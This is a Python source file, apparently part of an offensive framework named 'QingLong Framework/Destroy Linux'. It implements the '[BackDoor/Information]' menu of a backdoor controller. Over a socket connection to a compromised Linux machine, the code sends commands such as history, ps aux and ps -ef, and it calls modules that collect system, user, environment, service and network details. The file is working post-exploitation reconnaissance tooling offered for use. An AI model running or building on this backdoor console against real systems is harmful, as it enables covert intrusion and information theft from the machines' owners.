import os
import sys
import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from AuxiliaryFunctions import MyTable
from DestroyLinux.Informations_linux import systeminfo
from DestroyLinux.Informations_linux import UserAndGroup
from DestroyLinux.Informations_linux import EnvironmentalInformation
from DestroyLinux.Informations_linux import ServiceInformation
from DestroyLinux.Informations_linux import NetworkRoutingandCommunication


class information:
    def __init__(self, conn):
        commands = ["back", "show params", "show functions"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Destroy Linux)-\033[0m\033[1;31;31m[BackDoor/Information] \033[0m')
        history = InMemoryHistory()
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer, history=history)
                if choice.lower() == 'show functions':
                    self.show_functions()
                    continue
                elif choice == "":
                    continue
                elif choice == 'back':
                    break
                elif choice == '1':
                    systeminfo.systeminfo(conn)
                    continue
                elif choice == '2':
                    UserAndGroup.UserAndGroup(conn)
                    continue
                elif choice == '3':
                    EnvironmentalInformation.EnvironmentalInformation(conn)
                    continue
                elif choice == '4':
                    print('\033[1;32;32m' + "[+] 查看历史命令:" + '\033[0m')
                    command = "history"
                    self.receive(conn, command)
                elif choice == '5':
                    print('\033[1;32;32m' + "[+] 以用户的格式显示所有进程,包括非终端的进程:" + '\033[0m')
                    command = "ps aux"
                    self.receive(conn, command)
                    print('\033[1;32;32m' + "[+] 显示所有进程,显示UID,PPIP(父进程）,C与STIME栏位:" + '\033[0m')
                    command = "ps -ef"
                    self.receive(conn, command)
                elif choice == '6':
                    ServiceInformation.ServiceInformation(conn)
                    continue
                elif choice == '7':
                    NetworkRoutingandCommunication.NetworkRoutingandCommunication(conn)
                    continue
                # elif choice == 'show params':
                #     self.show_params()
                #     continue
            except:
                print('\033[1;34;34m' + "[-] something wrong!" + '\033[0m')
                continue

    def receive(self, conn, command):
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Information Collection" + '\033[0m' + "\n" + '=' * len("Information Collection") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "Kernel, Operating System, and Device Information", "1", "内核，操作系统和设备信息"],
                  ["2", "User and Group", "2", "用户和群组"], ["3", "Environmental information of the system", "3", "环境信息"], ["4", "history", "4", "查看历史命令"],
                  ["5", "Process information", "5", "进程信息"], ["6", "Service Information", "6", "服务信息"],
                  ["7", "Network, Routing, and Communication", "7", "网络、路由和通信"]]
        MyTable.createTable(headers, mydata)
